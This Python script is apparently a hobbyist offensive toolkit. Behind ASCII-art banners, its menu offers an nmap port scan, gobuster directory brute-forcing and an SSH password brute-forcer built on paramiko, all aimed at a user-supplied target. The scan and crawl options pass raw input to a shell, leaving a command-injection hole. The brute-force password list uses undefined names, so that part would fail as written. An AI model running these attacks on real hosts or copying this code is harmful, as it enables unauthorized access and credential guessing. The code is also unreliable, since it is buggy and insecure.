#pip install paramiko
import time
import subprocess
import argparse
import os

class bcolors:
    HEADER = '\033[95m'
    OKBLUE = '\033[94m'
    OKGREEN = '\033[92m'
    WARNING = '\033[93m'
    FAIL = '\033[91m'
    ENDC = '\033[0m'
    BOLD = '\033[1m'
    UNDERLINE = '\033[4m'

print(f"""{bcolors.OKBLUE}
████████╗██╗░░██╗███████╗  ███╗░░░███╗░█████╗░███╗░░██╗██╗░░██╗███████╗██╗░░░██╗  ███╗░░░███╗░█████╗░██████╗░███████╗
╚══██╔══╝██║░░██║██╔════╝  ████╗░████║██╔══██╗████╗░██║██║░██╔╝██╔════╝╚██╗░██╔╝  ████╗░████║██╔══██╗██╔══██╗██╔════╝
░░░██║░░░███████║█████╗░░  ██╔████╔██║██║░░██║██╔██╗██║█████═╝░█████╗░░░╚████╔╝░  ██╔████╔██║███████║██║░░██║█████╗░░
░░░██║░░░██╔══██║██╔══╝░░  ██║╚██╔╝██║██║░░██║██║╚████║██╔═██╗░██╔══╝░░░░╚██╔╝░░  ██║╚██╔╝██║██╔══██║██║░░██║██╔══╝░░
░░░██║░░░██║░░██║███████╗  ██║░╚═╝░██║╚█████╔╝██║░╚███║██║░╚██╗███████╗░░░██║░░░  ██║░╚═╝░██║██║░░██║██████╔╝███████╗
░░░╚═╝░░░╚═╝░░╚═╝╚══════╝  ╚═╝░░░░░╚═╝░╚════╝░╚═╝░░╚══╝╚═╝░░╚═╝╚══════╝░░░╚═╝░░░  ╚═╝░░░░░╚═╝╚═╝░░╚═╝╚═════╝░╚══════╝

░█████╗░██╗░░░██╗████████╗░█████╗░  ████████╗░█████╗░░█████╗░██╗░░░░░░░░
██╔══██╗██║░░░██║╚══██╔══╝██╔══██╗  ╚══██╔══╝██╔══██╗██╔══██╗██║░░░░░░░░
███████║██║░░░██║░░░██║░░░██║░░██║  ░░░██║░░░██║░░██║██║░░██║██║░░░░░░░░
██╔══██║██║░░░██║░░░██║░░░██║░░██║  ░░░██║░░░██║░░██║██║░░██║██║░░░░░░░░
██║░░██║╚██████╔╝░░░██║░░░╚█████╔╝  ░░░██║░░░╚█████╔╝╚█████╔╝███████╗██╗
╚═╝░░╚═╝░╚═════╝░░░░╚═╝░░░░╚════╝░  ░░░╚═╝░░░░╚════╝░░╚════╝░╚══════╝╚═╝\n
                    Made By Tristan (MonkeyMapper)""")
print(f'{bcolors.OKGREEN}select your attack!\n1: Port scanner\n2: WebCrawler\n3: BruteSSH\n4: Coming Soon\n5: Coming Soon\n6: Coming soon bro!')
user_selection = int(input())
if user_selection == 1:
    print(""")
    ███╗░░░███╗░█████╗░███╗░░██╗██╗░░██╗███████╗██╗░░░██╗  ███╗░░░███╗░█████╗░██████╗░██████╗░███████╗██████╗░
    ████╗░████║██╔══██╗████╗░██║██║░██╔╝██╔════╝╚██╗░██╔╝  ████╗░████║██╔══██╗██╔══██╗██╔══██╗██╔════╝██╔══██╗
    ██╔████╔██║██║░░██║██╔██╗██║█████═╝░█████╗░░░╚████╔╝░  ██╔████╔██║███████║██████╔╝██████╔╝█████╗░░██████╔╝
    ██║╚██╔╝██║██║░░██║██║╚████║██╔═██╗░██╔══╝░░░░╚██╔╝░░  ██║╚██╔╝██║██╔══██║██╔═══╝░██╔═══╝░██╔══╝░░██╔══██╗
    ██║░╚═╝░██║╚█████╔╝██║░╚███║██║░╚██╗███████╗░░░██║░░░  ██║░╚═╝░██║██║░░██║██║░░░░░██║░░░░░███████╗██║░░██║
    ╚═╝░░░░░╚═╝░╚════╝░╚═╝░░╚══╝╚═╝░░╚═╝╚══════╝░░░╚═╝░░░  ╚═╝░░░░░╚═╝╚═╝░░╚═╝╚═╝░░░░░╚═╝░░░░░╚══════╝╚═╝░░╚═╝""")
    print("\n****************************************************************")
    print("\n* Copyright of Tristan Flores, 2024                              *")
    print("\n****************************************************************")

    print(f"\n\n{bcolors.OKGREEN}Enter the IP you want to scan...")
    user_port_num = input()
    
    try:
        nmapscan = subprocess.run(f'nmap -sV -sT -Pn -v {user_port_num}',capture_output=True, shell=True, text=True)
        print("Working on it, have some patience!")
        print(nmapscan.stdout)
        
        
        
    except Exception as e:
        print(f'Failed you are dog shit! {e}')
elif user_selection == 2:
    #build Webcrawler!
    print(f"""{bcolors.OKBLUE}
░██████╗██████╗░██╗██████╗░██████╗░███████╗██████╗░███╗░░░███╗░█████╗░███╗░░██╗██╗░░██╗███████╗██╗░░░██╗
██╔════╝██╔══██╗██║██╔══██╗██╔══██╗██╔════╝██╔══██╗████╗░████║██╔══██╗████╗░██║██║░██╔╝██╔════╝╚██╗░██╔╝
╚█████╗░██████╔╝██║██║░░██║██║░░██║█████╗░░██████╔╝██╔████╔██║██║░░██║██╔██╗██║█████═╝░█████╗░░░╚████╔╝░
░╚═══██╗██╔═══╝░██║██║░░██║██║░░██║██╔══╝░░██╔══██╗██║╚██╔╝██║██║░░██║██║╚████║██╔═██╗░██╔══╝░░░░╚██╔╝░░
██████╔╝██║░░░░░██║██████╔╝██████╔╝███████╗██║░░██║██║░╚═╝░██║╚█████╔╝██║░╚███║██║░╚██╗███████╗░░░██║░░░
╚═════╝░╚═╝░░░░░╚═╝╚═════╝░╚═════╝░╚══════╝╚═╝░░╚═╝╚═╝░░░░░╚═╝░╚════╝░╚═╝░░╚══╝╚═╝░░╚═╝╚══════╝░░░╚═╝░░░\n{bcolors.OKBLUE}  ***Still Just Monkeying Around, Go Bananas!!***\n""")
    print(f"{bcolors.OKGREEN}Enter the website you want to crawl...")
    user_web_input = input()
    
    try:
        results = subprocess.run(f'gobuster dir -u {user_web_input} -w /usr/share/wordlists/dirb/common.txt -e',capture_output=True, shell=True, text=True)
        print("Working on it, have some patience!")
        print(results.stdout)
        
        
        
    except Exception as e:
        print(f'Failed you are dog shit! {e}')
    

elif user_selection == 3:

    import paramiko
    print(f"""
    ██████╗░░█████╗░██████╗░░█████╗░███╗░░░███╗░█████╗░███╗░░██╗██╗░░██╗███████╗██╗░░░██╗
    ██╔══██╗██╔══██╗██╔══██╗██╔══██╗████╗░████║██╔══██╗████╗░██║██║░██╔╝██╔════╝╚██╗░██╔╝
    ██████╔╝███████║██████╔╝███████║██╔████╔██║██║░░██║██╔██╗██║█████═╝░█████╗░░░╚████╔╝░
    ██╔═══╝░██╔══██║██╔══██╗██╔══██║██║╚██╔╝██║██║░░██║██║╚████║██╔═██╗░██╔══╝░░░░╚██╔╝░░
    ██║░░░░░██║░░██║██║░░██║██║░░██║██║░╚═╝░██║╚█████╔╝██║░╚███║██║░╚██╗███████╗░░░██║░░░
    ╚═╝░░░░░╚═╝░░╚═╝╚═╝░░╚═╝╚═╝░░╚═╝╚═╝░░░░░╚═╝░╚════╝░╚═╝░░╚══╝╚═╝░░╚═╝╚══════╝░░░╚═╝░░░\n{bcolors.FAIL}***Were Just Monkeying Around!!***\n""")
    print("Please enter your target IP...")
    print("please enter your target Username...")
    print("Please enter your password list (Example: password_medium.txt)...")
    def ssh_brute_force(target, username, password_list):
        ssh = paramiko.SSHClient()
        ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
        for password in password_list:
            try: 
                ssh.connect(target, username=username, password=password)
                print(f'{bcolors.OKGREEN}Success! Username: {username}, Password: {password}')
                return
            except paramiko.AuthenticationException:
                print(f'Failed: {password}')

    target = input()
    username = input()
    password_list = [12345, Password, bananas]
    ssh_brute_force(target, username, password_list)
    
else:
    print(f'{bcolors.FAIL}BRO DID YOU NOT READ THE COMING SOON!!!!')
